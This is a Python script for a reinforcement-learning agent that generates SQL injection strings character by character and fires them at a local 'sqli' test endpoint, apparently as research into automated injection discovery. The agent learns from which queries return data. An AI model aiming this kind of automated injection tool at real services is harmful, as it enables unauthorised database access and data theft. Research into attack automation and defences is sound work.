import agent as dqnagent
import state
import numpy as np
import requests
import argparse
from collections import deque

parser = argparse.ArgumentParser()
parser.add_argument(
    "--supervise", help="Perform supervised learning with argument as file")
parser.add_argument("--batchsize", help="Training batch size", default=32)
parser.add_argument("--epochs", help="num epochs", default=10)
parser.add_argument("model")
args = parser.parse_args()

filename = args.model

# TODO: Hyperparameter.
# This is the maxmimum length of our query string
input_len = 20
context_len = 5
max_qstringlen = 50

agent = dqnagent.Agent(input_len, context_len)
table = state.State()
failed_attempts = {}
queries = set()
while True:
    # Iterate through the state table and try to add on to each item in there (plus the empty string)
    for context in table:
        value = table.value()

        qstring = ""
        input_state = ""
        experience = dqnagent.Experience()
        # Predict a character until it produces an end-of-string character (|) or it reaches the max length
        while not qstring.endswith("|") and len(qstring) < max_qstringlen:
            # Shrink our query down to length input_len
            input_state = qstring[-input_len:]
            attempts = []
            if (input_state, context) in failed_attempts:
                attempts = failed_attempts[input_state, context]
            action = agent.act(input_state, context, attempts)
            experience.add(input_state, context, attempts, action)
            qstring += action

        # Remove the trailing bar, it's not actually supposed to be sent
        chopped = qstring
        if qstring.endswith("|"):
            chopped = qstring[:-1]

        # Is this a repeat or blank?
        repeat = qstring in queries or (chopped.split("%")[0][-1:] == "'")
        queries.add(qstring)

        success = False
        if not repeat:
            # Perform the action
            param = {"user_id": chopped}
            req = requests.get(
                "http://localhost:8081/api/v0/sqli/select", params=param)
            success = req.status_code == 200 and len(req.text) > 2

        # If the query was successful, update the state table
        if success:
            print("Got a hit!", qstring)
            lastchar = chopped.split("%")[0][-1:]
            table.update(context+lastchar)
            # Find out what reward we received
            value_new = table.value()
            reward = value_new - value

            # Learn from how that action performed
            attempts = []
            if (input_state, context) in failed_attempts:
                attempts = failed_attempts[input_state, context]
            agent.train_single(qstring[-1], context,
                               input_state, attempts, reward)
            agent.train_experience(experience, success)

        else:
            # Add the character we just tried to the list of failures
            #   So that we can use it as input in later attempts
            lastchar = chopped.split("%")[0][-1:]
            guess_state = chopped.split("%")[0][:-1][-input_len:]
            print("Incorrect: ", qstring)
            if (guess_state, context) in failed_attempts:
                failures = failed_attempts[guess_state, context]
                if lastchar not in failures:
                    failures.extend(lastchar)
                    failed_attempts[guess_state, context] = failures
            # Add this character to the list of failures
            #   Unless this was just a repeat. In which case ignore it
            elif not repeat:
                failed_attempts[guess_state, context] = [lastchar]
